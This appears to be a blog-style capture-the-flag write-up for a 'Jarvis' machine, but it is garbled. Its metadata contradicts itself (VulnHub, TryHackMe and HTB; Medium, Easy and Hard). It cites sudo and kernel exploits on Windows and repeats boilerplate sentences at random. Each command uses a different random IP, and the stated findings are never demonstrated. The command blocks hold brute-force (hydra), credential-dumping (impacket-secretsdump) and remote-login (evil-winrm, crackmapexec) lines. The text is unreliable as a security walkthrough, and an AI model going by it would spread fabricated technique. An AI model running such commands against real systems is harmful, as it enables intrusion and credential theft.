---
TitleSEO: "VulnHub — Jarvis (Medium Windows) | ZureFX"
TitlePost: "VulnHub — Jarvis (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Jarvis. Writable PATH and CORS Misconfiguration to achieve medium compromise on Windows."
Keywords: "tryhackme, active directory, web, easy, hard"
URL: "https://zurefx.github.io/writeups/htb-jarvis-443.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-jarvis-443/"
Date: "2024-01-22"
Tags: "TryHackMe, Active Directory, Web, Easy, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-jarvis-443"
Permalink: "/writeups/htb-jarvis-443.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Jarvis** is rated **Medium** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.64.130.78`.

### Objectives

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.54.127.161 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.80.206.203 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.12.205.99 -u administrator -p 'P@ssw0rd!'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.72.229.137 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

### Web Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code.

```bash
nmap -sCV -p53,636,25 10.11.111.82 -oN scan.txt
```

The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

## Exploitation

### Vulnerability Identification

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities. Lateral movement was facilitated by reusing discovered credentials across services.

Key finding: **Writable PATH**.

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

### Initial Access

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.55.199.12 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.85.103.31 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.36.12.16
```

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.123.1.234
crackmapexec smb 10.121.206.220 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.35.157.242 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
crackmapexec smb 10.32.224.106 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.77.120.46
feroxbuster -h
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `smbexec`
- `kerbrute`
- `john`
- `smbclient`

### Key Takeaways

- Writable PATH
- CORS Misconfiguration
